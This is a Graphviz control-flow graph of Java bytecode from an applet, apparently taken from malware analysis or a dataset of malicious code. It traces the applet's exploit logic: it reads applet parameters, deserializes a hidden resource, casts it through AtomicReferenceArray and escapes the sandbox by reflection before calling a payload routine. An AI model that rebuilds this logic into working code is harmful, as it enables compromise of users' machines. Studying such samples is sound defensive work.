digraph "" {
    "r0 := @this: hw"
    "new java.lang.StringBuilder"
    "r0 := @this: hw"->"new java.lang.StringBuilder";
    "dup1.r"
    "new java.lang.StringBuilder"->"dup1.r";
    "load.r r0"
    "dup1.r"->"load.r r0";
    "push \"val\""
    "load.r r0"->"push \"val\"";
    "virtualinvoke <hw: java.lang.String getParameter(java.lang.String)>"
    "push \"val\""->"virtualinvoke <hw: java.lang.String getParameter(java.lang.String)>";
    "staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>"
    "virtualinvoke <hw: java.lang.String getParameter(java.lang.String)>"->"staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>";
    "specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>"
    "staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>"->"specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>";
    "specialinvoke <java.lang.StringBuilder: void <init>(java.lang.String)>"->"load.r r0";
    "push \"prime\""
    "load.r r0"->"push \"prime\"";
    "push \"prime\""->"virtualinvoke <hw: java.lang.String getParameter(java.lang.String)>";
    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"
    "virtualinvoke <hw: java.lang.String getParameter(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>";
    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"
    "virtualinvoke <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>"->"virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>";
    "store.r r0"
    "virtualinvoke <java.lang.StringBuilder: java.lang.String toString()>"->"store.r r0";
    "push class \"[Lmac;\""
    "store.r r0"->"push class \"[Lmac;\"";
    "virtualinvoke <java.lang.Class: java.lang.String getName()>"
    "push class \"[Lmac;\""->"virtualinvoke <java.lang.Class: java.lang.String getName()>";
    "staticinvoke <mac: java.io.InputStream qwe(java.lang.String)>"
    "virtualinvoke <java.lang.Class: java.lang.String getName()>"->"staticinvoke <mac: java.io.InputStream qwe(java.lang.String)>";
    "store.r r4"
    "staticinvoke <mac: java.io.InputStream qwe(java.lang.String)>"->"store.r r4";
    "new java.io.ObjectInputStream"
    "store.r r4"->"new java.io.ObjectInputStream";
    "new java.io.ObjectInputStream"->"dup1.r";
    "load.r r4"
    "dup1.r"->"load.r r4";
    "specialinvoke <java.io.ObjectInputStream: void <init>(java.io.InputStream)>"
    "load.r r4"->"specialinvoke <java.io.ObjectInputStream: void <init>(java.io.InputStream)>";
    "virtualinvoke <java.io.ObjectInputStream: java.lang.Object readObject()>"
    "specialinvoke <java.io.ObjectInputStream: void <init>(java.io.InputStream)>"->"virtualinvoke <java.io.ObjectInputStream: java.lang.Object readObject()>";
    "checkcast"
    "virtualinvoke <java.io.ObjectInputStream: java.lang.Object readObject()>"->"checkcast";
    "checkcast"->"dup1.r";
    "push 1"
    "dup1.r"->"push 1";
    "arrayread.r"
    "push 1"->"arrayread.r";
    "arrayread.r"->"checkcast";
    "checkcast"->"store.r r4";
    "push class \"Ljava/util/concurrent/atomic/AtomicReferenceArray;\""
    "store.r r4"->"push class \"Ljava/util/concurrent/atomic/AtomicReferenceArray;\"";
    "staticget <test: java.lang.String zz>"
    "push class \"Ljava/util/concurrent/atomic/AtomicReferenceArray;\""->"staticget <test: java.lang.String zz>";
    "push 2"
    "staticget <test: java.lang.String zz>"->"push 2";
    "newarray"
    "push 2"->"newarray";
    "store.r $r18"
    "newarray"->"store.r $r18";
    "load.r $r18"
    "store.r $r18"->"load.r $r18";
    "push 0"
    "load.r $r18"->"push 0";
    "staticget <java.lang.Integer: java.lang.Class TYPE>"
    "push 0"->"staticget <java.lang.Integer: java.lang.Class TYPE>";
    "arraywrite.r"
    "staticget <java.lang.Integer: java.lang.Class TYPE>"->"arraywrite.r";
    "arraywrite.r"->"load.r $r18";
    "load.r $r18"->"push 1";
    "push class \"Ljava/lang/Object;\""
    "push 1"->"push class \"Ljava/lang/Object;\"";
    "push class \"Ljava/lang/Object;\""->"arraywrite.r";
    "arraywrite.r"->"load.r $r18";
    "virtualinvoke <java.lang.Class: java.lang.reflect.Method getMethod(java.lang.String,java.lang.Class[])>"
    "load.r $r18"->"virtualinvoke <java.lang.Class: java.lang.reflect.Method getMethod(java.lang.String,java.lang.Class[])>";
    "virtualinvoke <java.lang.Class: java.lang.reflect.Method getMethod(java.lang.String,java.lang.Class[])>"->"push 2";
    "push 2"->"newarray";
    "newarray"->"store.r $r18";
    "store.r $r18"->"load.r $r18";
    "load.r $r18"->"push 0";
    "push 0"->"push 0";
    "staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>"
    "push 0"->"staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>";
    "staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>"->"arraywrite.r";
    "arraywrite.r"->"load.r $r18";
    "load.r $r18"->"push 1";
    "staticinvoke <test: java.lang.Object zx()>"
    "push 1"->"staticinvoke <test: java.lang.Object zx()>";
    "staticinvoke <test: java.lang.Object zx()>"->"arraywrite.r";
    "arraywrite.r"->"load.r r4";
    "load.r r4"->"load.r $r18";
    "virtualinvoke <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>"
    "load.r $r18"->"virtualinvoke <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>";
    "pop"
    "virtualinvoke <java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])>"->"pop";
    "pop"->"push 0";
    "push 0"->"arrayread.r";
    "arrayread.r"->"checkcast";
    "checkcast"->"push 0";
    "push 0"->"arrayread.r";
    "arrayread.r"->"load.r r0";
    "staticinvoke <mac: void fuck(mac,java.lang.String)>"
    "load.r r0"->"staticinvoke <mac: void fuck(mac,java.lang.String)>";
    "goto return"
    "staticinvoke <mac: void fuck(mac,java.lang.String)>"->"goto return";
    "return"
    "goto return"->"return";
    "staticinvoke <mac: void fuck(mac,java.lang.String)>"->"store.r r0";
}
